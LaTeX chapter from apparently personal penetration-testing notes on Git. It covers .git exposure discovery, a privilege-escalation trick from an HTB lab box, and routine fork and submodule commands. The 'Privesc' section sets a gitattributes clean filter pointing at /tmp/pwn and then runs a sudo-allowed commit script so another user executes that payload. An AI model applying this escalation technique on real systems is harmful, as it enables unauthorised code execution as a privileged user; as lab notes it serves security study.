\chapter{Git}

\section{Web exposition}

wordlist: \verb+eclists/Discovery/Web-Content/versioning_metafiles.txt+

\href{https://git-scm.com/book/en/v2/Getting-Started-About-Version-Control}{Git}
\section{Commands}

\begin{verbatim}
$ git log
$ git show 47241a47f62ada864ec74bd6dedc4d33f4374699
\end{verbatim}

\section{Privesc}

\subsection{Git Attributes}

\href{https://git-scm.com/book/en/v2/Customizing-Git-Git-Attributes}{Git
Attributes}

\begin{verbatim}
#!/bin/bash

u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)

if [[ $u ]]; then
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
else
        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify

\end{verbatim}


\begin{verbatim}
git init
echo '*.php filter=indent' > .git/info/attributes
git config filter.indent.clean /tmp/pwn
sudo -u XXX /var/www/image/scripts/git-commit.sh
\end{verbatim}

\input{network/git/tools}

\section{Git usage}

\subsection{github}

\url{https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/about-forks}

\url{https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork}

\url{https://www.atlassian.com/git/tutorials/comparing-workflows/feature-branch-workflow}
\subsubsection{create a fork}

\begin{verbatim}
gh auth login 
gh repo fork https://github.com/Pennyw0rth/NetExec.git
cd NetExec
git checkout -b <branch_name>
git add <some-file>
git commit
git push -u origin <branch_name>
\end{verbatim}


\subsection{Submodule}

\href{https://git-scm.com/book/fr/v2/Utilitaires-Git-Sous-modules}{sous-modules git}
\href{https://git-scm.com/book/en/v2/Git-Tools-Submodules}{git submodules}

Add a submodule
\begin{verbatim}
git submodule add <repository> <path>
git status
\end{verbatim}

Pull changes from submodule (fetch + merge) will work on master branch of the submodule
\begin{verbatim}
git submodule update --remote <module_name>
\end{verbatim}

to track another branch perform before the pull:
\begin{verbatim}
git config -f .gitmodules submodule.<module_name>.branch <branch_name>
\end{verbatim}

to have a summary of submodule modification in git status:
\begin{verbatim}
git config status.submodulesummary 1
\end{verbatim}



\subsubsection{working on submodules}

if working on a specific branch first go in the submodule and set it
\begin{verbatim}
git checkout <branch_name>
\end{verbatim}

then define merge option
\begin{verbatim}
 git submodule update --remote --merge
\end{verbatim}

perform a push if all submodule modification have been pushed:
\begin{verbatim}
git push --recurse-submodules=check
\end{verbatim}

pushing project and all submodules:
\begin{verbatim}
git push --recurse-submodules=on-demand
\end{verbatim}



